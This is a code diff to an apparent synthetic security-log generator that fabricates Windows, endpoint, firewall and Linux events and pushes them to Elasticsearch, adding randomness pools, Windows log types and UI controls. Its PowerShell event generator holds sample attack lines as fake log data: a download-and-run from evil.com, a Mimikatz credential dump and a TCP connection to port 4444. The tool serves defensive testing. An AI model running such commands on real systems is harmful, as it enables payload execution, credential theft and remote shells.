@@ -5,14 +5,62 @@ const rand = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
 const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];
 const randomHex = (len) => Array.from({length: len}, () => rand(0,15).toString(16)).join('');
 const randomIP = () => `${rand(1,254)}.${rand(0,255)}.${rand(0,255)}.${rand(1,254)}`;
-const randomPrivateIP = () => { const s = pick(['10','172.16','192.168']); if(s==='10') return `10.${rand(0,255)}.${rand(0,255)}.${rand(1,254)}`; if(s==='172.16') return `172.${rand(16,31)}.${rand(0,255)}.${rand(1,254)}`; return `192.168.${rand(0,255)}.${rand(1,254)}`; };
+const randomPrivateIP = () => { if (_pool) return pick(_pool.ips); const s = pick(['10','172.16','192.168']); if(s==='10') return `10.${rand(0,255)}.${rand(0,255)}.${rand(1,254)}`; if(s==='172.16') return `172.${rand(16,31)}.${rand(0,255)}.${rand(1,254)}`; return `192.168.${rand(0,255)}.${rand(1,254)}`; };
 const randomMAC = () => Array.from({length:6},()=>rand(0,255).toString(16).padStart(2,'0')).join(':');
 const randomPort = () => pick([80,443,8080,8443,22,21,25,53,110,143,993,995,3389,445,139,1433,3306,5432,8888,9200]);
 const randomHighPort = () => rand(49152,65535);
-const randomHostname = () => `${pick(['WS','PC','LT','SRV','DC','DB','WEB','APP','FW','SW'])}-${pick(['NYC','LON','SFO','CHI','DAL','SEA','BOS','MIA'])}-${rand(100,999)}`;
-const randomUser = () => pick(['jsmith','admin','mwilson','kjohnson','agarcia','lchen','rbrown','slee','dmartin','pthomas','nwilliams','cjones']);
+const _HOSTNAMES_BASE = () => `${pick(['WS','PC','LT','SRV','DC','DB','WEB','APP','FW','SW'])}-${pick(['NYC','LON','SFO','CHI','DAL','SEA','BOS','MIA'])}-${rand(100,999)}`;
+const _USERS_LIST = ['jsmith','admin','mwilson','kjohnson','agarcia','lchen','rbrown','slee','dmartin','pthomas','nwilliams','cjones'];
+let _pool = null;
+let _emailDomain = null;
+function setPool(size) {
+  if (size === null) { _pool = null; return; }
+  const n = (fn, sz) => Array.from({length: sz}, fn);
+  const hSize = Math.max(3, size);
+  const uSize = Math.max(2, Math.round(hSize * 0.6));
+  const ipSize = Math.max(3, Math.round(hSize * 1.5));
+  _pool = {
+    hostnames: n(_HOSTNAMES_BASE, hSize),
+    users: _USERS_LIST.slice(0, uSize),
+    ips: n(() => `192.168.${rand(1,5)}.${rand(1,254)}`, ipSize),
+  };
+}
+// Per-vendor pool caps: null = fully random, number = hard cap on unique hostnames/IPs/users
+const VENDOR_POOL = {
+  fortinet: { low: 2,   med: 4,   high: 8    },
+  paloalto: { low: 2,   med: 4,   high: 8    },
+  switch:   { low: 3,   med: 5,   high: 8    },
+  email:    { low: 20,  med: 50,  high: 100  },
+  endpoint: { low: 10,  med: 50,  high: null },
+  windows:  { low: 8,   med: 40,  high: null },
+  linux:    { low: 5,   med: 15,  high: null },
+};
+const VENDOR_RND_DEFAULT = {
+  fortinet: 'med', paloalto: 'med', switch: 'low',
+  email: 'med', endpoint: 'high', windows: 'med', linux: 'med',
+};
+const VENDOR_LOG_COUNT = {
+  fortinet: { low: 100, med: 250, high: 500  },
+  paloalto: { low: 100, med: 250, high: 500  },
+  switch:   { low: 50,  med: 150, high: 300  },
+  email:    { low: 20,  med: 50,  high: 100  },
+  endpoint: { low: 100, med: 300, high: 1000 },
+  windows:  { low: 100, med: 300, high: 1000 },
+  linux:    { low: 50,  med: 200, high: 500  },
+};
+// Per Windows log type min counts by randomness level
+const WIN_TYPE_LOG_COUNT = {
+  security:    { low: 60,  med: 150, high: 500 },
+  application: { low: 20,  med: 50,  high: 150 },
+  system:      { low: 20,  med: 50,  high: 150 },
+  applocker:   { low: 15,  med: 40,  high: 100 },
+  powershell:  { low: 15,  med: 40,  high: 150 },
+};
+const WIN_TYPES_DEFAULT = ['security','application','system'];
+const randomHostname = () => _pool ? pick(_pool.hostnames) : _HOSTNAMES_BASE();
+const randomUser = () => _pool ? pick(_pool.users) : pick(_USERS_LIST);
 const randomDomain = () => pick(['contoso.com','fabrikam.com','acme-corp.net','globex.io','initech.com','umbrella-corp.net']);
-const randomEmail = () => `${randomUser()}@${randomDomain()}`;
+const randomEmail = () => `${randomUser()}@${_emailDomain||randomDomain()}`;
 const formatTimestamp = (d) => d.toISOString();
 const syslogTimestamp = (d) => { const M=['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec']; return `${M[d.getMonth()]} ${String(d.getDate()).padStart(2,' ')} ${String(d.getHours()).padStart(2,'0')}:${String(d.getMinutes()).padStart(2,'0')}:${String(d.getSeconds()).padStart(2,'0')}`; };
 const generateTimestamps = (count, mins=60) => { const now=new Date(), start=new Date(now-mins*60000); return Array.from({length:count},()=>new Date(start.getTime()+Math.random()*(now-start))).sort((a,b)=>a-b); };
@@ -74,10 +122,58 @@ function genEndpointAlert(ts){const hn=randomHostname();return JSON.stringify({"
 function generateEndpointLogs(count,tr){return generateTimestamps(count,tr).map(ts=>{const r=Math.random();return r<0.4?genEndpointProcess(ts):r<0.7?genEndpointNetwork(ts):genEndpointAlert(ts);});}
 
 // ─── Windows Event Generator ──────────────────────────────────────────────────
-function genWinLogon(ts){const user=randomUser(),domain=randomDomain().split('.')[0].toUpperCase(),isFailure=Math.random()<0.2,eid=isFailure?4625:4624,hn=randomHostname();return `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing"/><EventID>${eid}</EventID><TimeCreated SystemTime="${formatTimestamp(ts)}"/><Channel>Security</Channel><Computer>${hn}.${randomDomain()}</Computer></System><EventData><Data Name="TargetUserName">${user}</Data><Data Name="TargetDomainName">${domain}</Data><Data Name="LogonType">${pick([2,3,7,10])}</Data><Data Name="AuthenticationPackageName">${pick(['NTLM','Kerberos'])}</Data><Data Name="IpAddress">${randomIP()}</Data>${isFailure?`<Data Name="Status">${pick(['0xC000006A','0xC0000064'])}</Data>`:''}</EventData></Event>`;}
-function genWinPS(ts){const susp=Math.random()<0.3,script=susp?pick(['IEX (New-Object Net.WebClient).DownloadString("http://evil.com/shell.ps1")','Invoke-Mimikatz -DumpCreds','$c = New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444)']):pick(['Get-Service | Where-Object {$_.Status -eq "Running"}','Get-EventLog -LogName Security -Newest 100']);return `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-PowerShell"/><EventID>4104</EventID><Level>${susp?3:5}</Level><TimeCreated SystemTime="${formatTimestamp(ts)}"/><Channel>Microsoft-Windows-PowerShell/Operational</Channel><Computer>${randomHostname()}.${randomDomain()}</Computer></System><EventData><Data Name="ScriptBlockText">${script}</Data></EventData></Event>`;}
-function genWinService(ts){const svc=pick(['wuauserv','BITS','Spooler','WinDefend','EventLog','Dnscache']),state=pick(['running','stopped']);return `<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Service Control Manager"/><EventID>7036</EventID><TimeCreated SystemTime="${formatTimestamp(ts)}"/><Channel>System</Channel><Computer>${randomHostname()}.${randomDomain()}</Computer></System><EventData><Data Name="param1">${svc}</Data><Data Name="param2">${state}</Data></EventData></Event>`;}
-function generateWindowsEventLogs(count,tr){return generateTimestamps(count,tr).map(ts=>{const r=Math.random();return r<0.45?genWinLogon(ts):r<0.7?genWinService(ts):genWinPS(ts);});}
+function genWinSecurity(ts){
+  const isFailure=Math.random()<0.2,eid=isFailure?4625:4624;
+  const user=randomUser(),domain=randomDomain().split('.')[0].toUpperCase(),hn=randomHostname();
+  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:eid,channel:"Security",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-Security-Auditing",record_id:rand(10000,9999999),event_data:{TargetUserName:user,TargetDomainName:domain,LogonType:String(pick([2,3,7,10])),AuthenticationPackageName:pick(['NTLM','Kerberos']),IpAddress:randomIP(),...(isFailure?{Status:pick(['0xC000006A','0xC0000064']),SubStatus:'0x0'}:{SubjectUserName:'-',SubjectDomainName:'-'})}},event:{code:String(eid),action:isFailure?'logon-failed':'logged-in',category:['authentication'],outcome:isFailure?'failure':'success',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
+}
+function genWinAccountMgmt(ts){
+  const eid=pick([4720,4722,4724,4726,4728,4732]);
+  const user=randomUser(),domain=randomDomain().split('.')[0].toUpperCase(),hn=randomHostname();
+  const actions={4720:'user-account-created',4722:'user-account-enabled',4724:'password-reset',4726:'user-account-deleted',4728:'added-member-to-security-group',4732:'added-member-to-local-group'};
+  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:eid,channel:"Security",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-Security-Auditing",record_id:rand(10000,9999999),event_data:{TargetUserName:user,TargetDomainName:domain,SubjectUserName:pick(_USERS_LIST),SubjectDomainName:domain}},event:{code:String(eid),action:actions[eid]||'account-management',category:['iam'],outcome:'success',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
+}
+function genWinApplication(ts){
+  const eid=pick([1000,1001,1002,11707,11708]);
+  const app=pick(['MicrosoftEdge.exe','OUTLOOK.EXE','chrome.exe','Teams.exe','explorer.exe','svchost.exe']);
+  const hn=randomHostname();
+  const provs={1000:'Application Error',1001:'Windows Error Reporting',1002:'Application Error',11707:'MsiInstaller',11708:'MsiInstaller'};
+  const actions={1000:'application-error',1001:'application-crash-report',1002:'application-hang',11707:'application-installed',11708:'application-install-failed'};
+  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:eid,channel:"Application",computer_name:`${hn}.${randomDomain()}`,provider_name:provs[eid]||'Application Error',record_id:rand(10000,9999999),event_data:{ApplicationName:app,ApplicationVersion:`${rand(1,20)}.${rand(0,9)}.${rand(0,9999)}.0`,FaultingModuleName:pick(['ntdll.dll','kernelbase.dll','vcruntime140.dll',app]),ExceptionCode:`0x${randomHex(8)}`}},event:{code:String(eid),action:actions[eid]||'application-event',category:['process'],outcome:eid===11708?'failure':'unknown',kind:'event'},host:{name:hn,hostname:hn}});
+}
+function genWinSystem(ts){
+  const eid=pick([7036,7045,6005,6006,41,1074]);
+  const svc=pick(['wuauserv','BITS','Spooler','WinDefend','EventLog','Dnscache','LanmanWorkstation']);
+  const hn=randomHostname();
+  const state=pick(['running','stopped']);
+  const provs={7036:'Service Control Manager',7045:'Service Control Manager',6005:'EventLog',6006:'EventLog',41:'Microsoft-Windows-Kernel-Power',1074:'USER32'};
+  const actions={7036:`${svc}-state-change`,7045:'new-service-installed',6005:'event-log-started',6006:'event-log-stopped',41:'unexpected-shutdown',1074:'system-shutdown'};
+  const evtData=(eid===7036||eid===7045)?{ServiceName:svc,ServiceType:pick(['demand start','auto start']),NewState:state}:{};
+  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:eid,channel:"System",computer_name:`${hn}.${randomDomain()}`,provider_name:provs[eid]||'Service Control Manager',record_id:rand(10000,9999999),event_data:evtData},event:{code:String(eid),action:actions[eid]||'system-event',category:['process'],outcome:'unknown',kind:'event'},host:{name:hn,hostname:hn}});
+}
+function genWinAppLocker(ts){
+  const eid=pick([8003,8004,8006,8007]);
+  const isBlocked=eid===8004||eid===8007,isScript=eid===8006||eid===8007;
+  const app=isBlocked?pick(['mimikatz.exe','psexec.exe','nc.exe','mshta.exe','wscript.exe']):pick(['chrome.exe','outlook.exe','winword.exe','excel.exe']);
+  const hn=randomHostname(),user=randomUser(),domain=randomDomain().split('.')[0].toUpperCase();
+  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:eid,channel:isScript?"Microsoft-Windows-AppLocker/Script and Packaged app-Execution":"Microsoft-Windows-AppLocker/EXE and DLL",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-AppLocker",record_id:rand(10000,9999999),event_data:{PolicyName:isScript?'Script':'EXE and DLL',RuleName:isBlocked?'Block untrusted executables':'Allow signed executables',TargetUser:`${domain}\\${user}`,FilePath:`C:\\${pick(['Windows\\System32','Users\\'+user+'\\Downloads','Temp','ProgramData'])}\\${app}`,FileHash:randomHex(64)}},event:{code:String(eid),action:isBlocked?'app-locker-blocked':'app-locker-allowed',category:['process'],outcome:isBlocked?'failure':'success',kind:'event'},host:{name:hn,hostname:hn},user:{name:user,domain}});
+}
+function genWinPS(ts){
+  const susp=Math.random()<0.3;
+  const script=susp?pick(['IEX (New-Object Net.WebClient).DownloadString("http://evil.com/shell.ps1")','Invoke-Mimikatz -DumpCreds','$c = New-Object System.Net.Sockets.TCPClient("10.0.0.1",4444)']):pick(['Get-Service | Where-Object {$_.Status -eq "Running"}','Get-EventLog -LogName Security -Newest 100','Get-Process | Sort-Object CPU -Descending']);
+  const hn=randomHostname(),user=randomUser();
+  return JSON.stringify({"@timestamp":formatTimestamp(ts),winlog:{event_id:4104,channel:"Microsoft-Windows-PowerShell/Operational",computer_name:`${hn}.${randomDomain()}`,provider_name:"Microsoft-Windows-PowerShell",record_id:rand(10000,9999999),event_data:{ScriptBlockText:script,Path:susp?'':pick(['C:\\Scripts\\maintenance.ps1','C:\\Scripts\\backup.ps1','C:\\Scripts\\update.ps1'])}},event:{code:"4104",action:"script-block-logging",category:['process'],outcome:'unknown',kind:'event'},host:{name:hn,hostname:hn},user:{name:user}});
+}
+function generateWindowsEventLogs(count,tr,types=WIN_TYPES_DEFAULT){
+  const gens=[];
+  if(types.includes('security'))gens.push(genWinSecurity,genWinSecurity,genWinAccountMgmt);
+  if(types.includes('application'))gens.push(genWinApplication);
+  if(types.includes('system'))gens.push(genWinSystem);
+  if(types.includes('applocker'))gens.push(genWinAppLocker);
+  if(types.includes('powershell'))gens.push(genWinPS);
+  if(gens.length===0)gens.push(genWinSecurity);
+  return generateTimestamps(count,tr).map(ts=>pick(gens)(ts));
+}
 
 // ─── Linux Generator ──────────────────────────────────────────────────────────
 const LINUX_HOSTS=['web-prod-01','db-master-01','app-server-03','bastion-01','k8s-node-02','monitoring-01'];
@@ -110,9 +206,13 @@ const VENDOR_INGEST={
   switch:{getIndex(){return'logs-cisco.ios-default';},toDoc(l){const tm=l.match(/>(\w{3}\s+\d+\s+\d{2}:\d{2}:\d{2})/);const ts=tm?new Date(tm[1]+' '+new Date().getFullYear()).toISOString():new Date().toISOString();return{'@timestamp':ts,message:l,event:{dataset:'cisco.ios',module:'cisco',kind:'event',original:l},observer:{vendor:'Cisco',product:'Catalyst IOS',type:'switch'},agent:agentField('filebeat'),data_stream:dsField('cisco.ios')};}},
   email:{getIndex(l){if(l.trimStart().startsWith('{'))return'logs-o365.audit-default';if(l.includes('postfix/')||l.includes('NOQUEUE'))return'logs-system.syslog-default';return'logs-microsoft_exchange_server.log-default';},toDoc(l){let ds='microsoft_exchange_server.log',ts=new Date().toISOString();if(l.trimStart().startsWith('{')){try{const o=JSON.parse(l);ds='o365.audit';ts=o.CreationTime||ts;}catch{}}else if(l.includes('postfix/')){ds='system.syslog';}return{'@timestamp':ts,message:l,event:{dataset:ds,module:ds.split('.')[0],category:['email'],original:l},agent:agentField('filebeat'),data_stream:dsField(ds)};}},
   endpoint:{getIndex(l){try{const o=JSON.parse(l);if(o.event?.kind==='alert')return'logs-endpoint.alerts-default';if((o.event?.category||[]).includes('network'))return'logs-endpoint.events.network-default';}catch{}return'logs-endpoint.events.process-default';},toDoc(l){try{const o=JSON.parse(l);const cats=o.event?.category||[];let ds='endpoint.events.process';if(o.event?.kind==='alert')ds='endpoint.alerts';else if(cats.includes('network'))ds='endpoint.events.network';return{...o,agent:{...o.agent,type:'endpoint'},data_stream:dsField(ds),event:{...o.event,dataset:ds,module:'endpoint'}};}catch{return{'@timestamp':new Date().toISOString(),message:l,event:{dataset:'endpoint.events.process'},agent:agentField('elastic_agent'),data_stream:dsField('endpoint.events.process')};}}},
-  windows:{getIndex(l){if(l.includes('PowerShell')||l.includes('4104'))return'logs-windows.powershell_operational-default';if(l.includes('Security')||l.includes('4624')||l.includes('4625'))return'logs-windows.security-default';return'logs-windows.system-default';},toDoc(l){let ds='windows.system';if(l.includes('4104'))ds='windows.powershell_operational';else if(l.includes('4624')||l.includes('4625'))ds='windows.security';const ts=l.match(/SystemTime="([^"]+)"/);return{'@timestamp':ts?ts[1]:new Date().toISOString(),message:l,event:{dataset:ds,module:'windows',original:l},agent:agentField('winlogbeat'),data_stream:dsField(ds)};}},
+  windows:{
+    getIndex(l){try{const o=JSON.parse(l),ch=o.winlog?.channel||'';if(ch.includes('PowerShell'))return'logs-windows.powershell_operational-default';if(ch==='Security')return'logs-windows.security-default';if(ch==='Application')return'logs-windows.application-default';if(ch.includes('AppLocker'))return'logs-windows.applocker-default';return'logs-windows.system-default';}catch{return'logs-windows.system-default';}},
+    toDoc(l){try{const o=JSON.parse(l);const ch=o.winlog?.channel||'System';let ds='windows.system';if(ch.includes('PowerShell'))ds='windows.powershell_operational';else if(ch==='Security')ds='windows.security';else if(ch==='Application')ds='windows.application';else if(ch.includes('AppLocker'))ds='windows.applocker';return{...o,event:{...o.event,dataset:ds,module:'windows'},agent:agentField('winlogbeat'),data_stream:dsField(ds)};}catch{return{'@timestamp':new Date().toISOString(),message:l,event:{dataset:'windows.system',module:'windows'},agent:agentField('winlogbeat'),data_stream:dsField('windows.system')};}}
+  },
   linux:{getIndex(l){if(l.includes('sshd[')||l.includes('sudo:'))return'logs-system.auth-default';if(l.includes('audit['))return'logs-auditd.log-default';return'logs-system.syslog-default';},toDoc(l){let ds='system.syslog';if(l.includes('sshd[')||l.includes('sudo:'))ds='system.auth';else if(l.includes('audit['))ds='auditd.log';const ts=l.match(/^(\w{3}\s+\d+\s+\d{2}:\d{2}:\d{2})/);return{'@timestamp':ts?new Date(ts[1]+' '+new Date().getFullYear()).toISOString():new Date().toISOString(),message:l,event:{dataset:ds,module:ds.split('.')[0],original:l},agent:agentField('filebeat'),data_stream:dsField(ds)};}},
 };
+
 async function pushLogsToElastic(logs){
   const cfg=loadConfig();if(!cfg?.url)throw new Error('No Elasticsearch config found');
   const idxCounts={},bulkLines=[];
@@ -131,7 +231,7 @@ const VENDORS=[
   {id:'switch',name:'Cisco Switches',description:'IOS syslog: link state, STP, 802.1X, OSPF',tags:['Switch','STP','NAC','OSPF'],indices:['logs-cisco.ios-default'],generator:generateSwitchLogs},
   {id:'email',name:'E-Mail Systems',description:'Exchange tracking, Postfix MTA, and O365 audit logs',tags:['Exchange','Postfix','O365','Phishing'],indices:['logs-o365.audit-default','logs-microsoft_exchange_server.log-default'],generator:generateEmailLogs},
   {id:'endpoint',name:'Endpoint Telemetry',description:'EDR-style process, network, and alert events with MITRE ATT&CK',tags:['EDR','Process','MITRE','Alerts'],indices:['logs-endpoint.events.process-default','logs-endpoint.alerts-default'],generator:generateEndpointLogs},
-  {id:'windows',name:'Windows Events',description:'Security auditing (4624/4625), PowerShell, and service events',tags:['Security','PowerShell','Logon'],indices:['logs-windows.security-default','logs-windows.powershell_operational-default'],generator:generateWindowsEventLogs},
+  {id:'windows',name:'Windows Events',description:'Security (4624/4625), Application, System, AppLocker and PowerShell event logs via winlogbeat',tags:['Security','PowerShell','Logon','AppLocker'],indices:['logs-windows.security-default','logs-windows.application-default','logs-windows.system-default','logs-windows.powershell_operational-default','logs-windows.applocker-default'],generator:generateWindowsEventLogs},
   {id:'linux',name:'Linux / Syslog',description:'SSH auth, sudo, auditd syscalls, cron, and systemd',tags:['SSH','Auditd','Sudo','Syslog'],indices:['logs-system.auth-default','logs-auditd.log-default'],generator:generateLinuxLogs},
 ];
 const SCENARIOS=[
@@ -196,7 +296,8 @@ function ConfigDialog({open,onClose,onSave}){
 }
 
 // Vendor Card
-function VendorCard({vendor,selected,onToggle,integrationMissing}){
+const WIN_TYPE_LABELS={security:'Security',application:'Application',system:'System',applocker:'AppLocker',powershell:'PowerShell'};
+function VendorCard({vendor,selected,onToggle,integrationMissing,randomness,onRandomness,minLogs,onMinLogs,emailDomain,onEmailDomain,windowsLogTypes,onWindowsLogTypes}){
   return(
     <div onClick={()=>onToggle(vendor.id)} className={cn("relative cursor-pointer p-4 rounded-xl border-2 transition-all",selected?"border-blue-500 bg-blue-500/10 shadow-lg shadow-blue-500/10":"border-gray-700 hover:border-gray-500 bg-gray-900/60")}>
       {selected&&<div className="absolute top-2 right-2 w-5 h-5 rounded-full bg-blue-500 flex items-center justify-center"><span className="text-white text-[10px]">✓</span></div>}
@@ -214,10 +315,53 @@ function VendorCard({vendor,selected,onToggle,integrationMissing}){
       <div className="flex flex-wrap gap-1">
         {vendor.tags.map(t=><Badge key={t} className="border-gray-600 text-gray-400">{t}</Badge>)}
       </div>
-      {selected&&vendor.indices.length>0&&(
-        <div className="mt-2.5 pt-2.5 border-t border-blue-500/20 space-y-0.5">
-          {vendor.indices.slice(0,2).map(i=><p key={i} className="text-[9px] font-mono text-blue-400/80 truncate">{i}</p>)}
-          {vendor.indices.length>2&&<p className="text-[9px] font-mono text-gray-500">+{vendor.indices.length-2} more</p>}
+      {selected&&(
+        <div className="mt-2.5 pt-2.5 border-t border-blue-500/20" onClick={e=>e.stopPropagation()}>
+          <div className="flex items-center gap-1 mb-2">
+            <span className="text-[10px] text-gray-500 flex-1">Randomness</span>
+            {['low','med','high'].map(lvl=>(
+              <button key={lvl} onClick={()=>onRandomness(vendor.id,lvl)} className={cn("px-2 py-0.5 rounded text-[10px] font-medium transition-colors",randomness===lvl?"bg-blue-500 text-white":"bg-gray-700/80 text-gray-400 hover:bg-gray-600 hover:text-white")}>
+                {lvl.charAt(0).toUpperCase()+lvl.slice(1)}
+              </button>
+            ))}
+          </div>
+          <div className="flex items-center gap-2 mb-2">
+            <label className="text-[10px] text-gray-500 flex-1">Min logs</label>
+            <input type="number" min="1" value={minLogs} onChange={e=>onMinLogs(vendor.id,e.target.value)} className="w-20 bg-gray-900 border border-gray-600 rounded px-2 py-0.5 text-xs font-mono text-gray-200 focus:outline-none focus:border-blue-500 text-right"/>
+          </div>
+          {vendor.id==='email'&&(
+            <div className="mb-2">
+              <label className="text-[10px] text-gray-500 block mb-1">Custom domain (@ suffix)</label>
+              <input type="text" value={emailDomain} onChange={e=>onEmailDomain(e.target.value)} placeholder="e.g. acme.com" className="w-full bg-gray-900 border border-gray-600 rounded px-2 py-1 text-xs font-mono text-gray-200 focus:outline-none focus:border-blue-500"/>
+            </div>
+          )}
+          {vendor.id==='windows'&&(
+            <div className="mb-2">
+              <span className="text-[10px] text-gray-500 block mb-1">Log types</span>
+              <div className="grid grid-cols-2 gap-x-2 gap-y-1">
+                {Object.entries(WIN_TYPE_LABELS).map(([t,label])=>{
+                  const checked=(windowsLogTypes||[]).includes(t);
+                  const toggle=()=>{
+                    const next=checked?(windowsLogTypes||[]).filter(x=>x!==t):[...(windowsLogTypes||[]),t];
+                    if(next.length>0)onWindowsLogTypes(next);
+                  };
+                  return(
+                    <label key={t} className="flex items-center gap-1.5 cursor-pointer select-none" onClick={e=>e.stopPropagation()}>
+                      <input type="checkbox" checked={checked} onChange={toggle} className="accent-blue-500 w-3 h-3"/>
+                      <span className={`text-[10px] ${checked?'text-gray-200':'text-gray-500'}`}>{label}</span>
+                      {(t==='applocker'||t==='powershell')&&<span className="text-[9px] text-blue-400/70">opt</span>}
+                    </label>
+                  );
+                })}
+              </div>
+            </div>
+          )}
+          {vendor.indices.length>0&&(
+            <div className="space-y-0.5">
+              {vendor.indices.slice(0,2).map(i=><p key={i} className="text-[9px] font-mono text-blue-400/80 truncate">{i}</p>)}
+              {vendor.indices.length>2&&<p className="text-[9px] font-mono text-gray-500">+{vendor.indices.length-2} more</p>}
+            </div>
+          )}
           {integrationMissing&&<p className="text-[9px] text-amber-400 mt-1">⚠ Integration not in Fleet</p>}
         </div>
       )}
@@ -353,25 +497,86 @@ export default function App(){
   const [elasticConfig,setElasticConfig]=useState(loadConfig);
   // Home state
   const [selected,setSelected]=useState([]);
-  const [logCount,setLogCount]=useState(50);
+  const [vendorRandomness,setVendorRandomness]=useState(VENDOR_RND_DEFAULT);
+  const [vendorMinLogs,setVendorMinLogs]=useState(()=>
+    Object.fromEntries(Object.entries(VENDOR_RND_DEFAULT).map(([id,lvl])=>[id,VENDOR_LOG_COUNT[id]?.[lvl]||50]))
+  );
+  const [maxLogs,setMaxLogs]=useState(500);
   const [timeRange,setTimeRange]=useState('60');
   const [logs,setLogs]=useState({});
   const [generating,setGenerating]=useState(false);
   const [pushing,setPushing]=useState(false);
-  const [missingInteg,setMissingInteg]=useState([]);
+  const [emailDomain,setEmailDomain]=useState('');
+  const [windowsLogTypes,setWindowsLogTypes]=useState(WIN_TYPES_DEFAULT);
   // Scenarios state
   const [activeScenario,setActiveScenario]=useState(null);
   const [scenarioEvents,setScenarioEvents]=useState([]);
 
+  // Keep maxLogs >= sum of selected minimums
+  useEffect(()=>{
+    if(!selected.length)return;
+    const sum=selected.reduce((s,vid)=>s+(vendorMinLogs[vid]||50),0);
+    setMaxLogs(prev=>Math.max(prev,sum));
+  },[selected,vendorMinLogs]);
+
   const toggleVendor=useCallback(id=>setSelected(p=>p.includes(id)?p.filter(v=>v!==id):[...p,id]),[]);
+  const handleRandomness=useCallback((id,lvl)=>{
+    setVendorRandomness(p=>({...p,[id]:lvl}));
+    if(id==='windows'){
+      setWindowsLogTypes(types=>{
+        const sum=types.reduce((s,t)=>s+(WIN_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
+        setVendorMinLogs(p=>({...p,windows:Math.max(1,sum)}));
+        return types;
+      });
+    } else {
+      const def=VENDOR_LOG_COUNT[id]?.[lvl];
+      if(def)setVendorMinLogs(p=>({...p,[id]:def}));
+    }
+  },[]);
+  const handleWindowsLogTypes=useCallback((types)=>{
+    setWindowsLogTypes(types);
+    setVendorRandomness(prev=>{
+      const lvl=prev.windows||'med';
+      const sum=types.reduce((s,t)=>s+(WIN_TYPE_LOG_COUNT[t]?.[lvl]||0),0);
+      setVendorMinLogs(p=>({...p,windows:Math.max(1,sum)}));
+      return prev;
+    });
+  },[]);
+  const handleMinLogs=useCallback((id,val)=>{
+    const n=Math.max(1,parseInt(val)||1);
+    setVendorMinLogs(p=>({...p,[id]:n}));
+  },[]);
   const handleGenerate=useCallback(()=>{
     setGenerating(true);
     setTimeout(()=>{
+      // Step 1: each vendor gets its minimum
+      const vendorTotals={};
+      selected.forEach(vid=>{vendorTotals[vid]=Math.max(1,vendorMinLogs[vid]||50);});
+      const sumMins=Object.values(vendorTotals).reduce((s,n)=>s+n,0);
+      // Step 2: distribute remaining capacity randomly across selected vendors
+      const remaining=Math.max(0,maxLogs-sumMins);
+      if(remaining>0&&selected.length>0){
+        const weights=selected.map(()=>Math.random()+0.1);
+        const totalW=weights.reduce((s,w)=>s+w,0);
+        let assigned=0;
+        selected.forEach((vid,i)=>{
+          const share=i===selected.length-1?remaining-assigned:Math.round(weights[i]/totalW*remaining);
+          vendorTotals[vid]+=share;assigned+=share;
+        });
+      }
+      // Step 3: generate
       const nl={};
-      selected.forEach(vid=>{const v=VENDORS.find(x=>x.id===vid);if(v)nl[v.id]=v.generator(logCount,parseInt(timeRange));});
+      selected.forEach(vid=>{
+        const v=VENDORS.find(x=>x.id===vid);if(!v)return;
+        const lvl=vendorRandomness[vid]||'med';
+        setPool(VENDOR_POOL[vid]?.[lvl]??null);
+        _emailDomain=vid==='email'?(emailDomain.trim()||null):null;
+        nl[v.id]=vid==='windows'?generateWindowsEventLogs(vendorTotals[vid],parseInt(timeRange),windowsLogTypes):v.generator(vendorTotals[vid],parseInt(timeRange));
+      });
+      _emailDomain=null;
       setLogs(nl);setGenerating(false);
     },300);
-  },[selected,logCount,timeRange]);
+  },[selected,vendorMinLogs,maxLogs,vendorRandomness,timeRange,emailDomain,windowsLogTypes]);
 
   const handlePush=useCallback(async()=>{
     setPushing(true);
@@ -382,7 +587,7 @@ export default function App(){
       else alert(`✓ Pushed ${total} logs across ${Object.keys(indices).length} indices\n${idxList}`);
     }catch(e){alert(`Error: ${e.message}`);}
     finally{setPushing(false);}
-  },[logs]);
+  },[logs,elasticConfig]);
 
   const handleScenario=s=>{setActiveScenario(s);setScenarioEvents(s.generator());};
   const saveConfig=cfg=>{setElasticConfig(cfg);};
@@ -441,7 +646,7 @@ export default function App(){
               <div className="lg:col-span-3">
                 <h2 className="text-xs font-semibold text-gray-500 uppercase tracking-wider mb-4">Log Sources</h2>
                 <div className="grid grid-cols-1 sm:grid-cols-2 xl:grid-cols-3 gap-3">
-                  {VENDORS.map(v=><VendorCard key={v.id} vendor={v} selected={selected.includes(v.id)} onToggle={toggleVendor} integrationMissing={missingInteg.includes(v.id)}/>)}
+                  {VENDORS.map(v=><VendorCard key={v.id} vendor={v} selected={selected.includes(v.id)} onToggle={toggleVendor} integrationMissing={false} randomness={vendorRandomness[v.id]} onRandomness={handleRandomness} minLogs={vendorMinLogs[v.id]||50} onMinLogs={handleMinLogs} emailDomain={emailDomain} onEmailDomain={setEmailDomain}/>)}
                 </div>
               </div>
               <div className="lg:col-span-1">
@@ -449,11 +654,11 @@ export default function App(){
                 <div className="sticky top-20 bg-gray-900 border border-gray-700 rounded-xl p-4 space-y-5">
                   <div className="space-y-2">
                     <div className="flex justify-between items-center">
-                      <label className="text-xs text-gray-400">Log Count</label>
-                      <span className="text-sm font-mono font-semibold text-white">{logCount}</span>
+                      <label className="text-xs text-gray-400">Max Total Logs</label>
+                      <span className="text-sm font-mono font-semibold text-white">{maxLogs.toLocaleString()}</span>
                     </div>
-                    <input type="range" min="10" max="500" step="10" value={logCount} onChange={e=>setLogCount(Number(e.target.value))} className="w-full accent-blue-500"/>
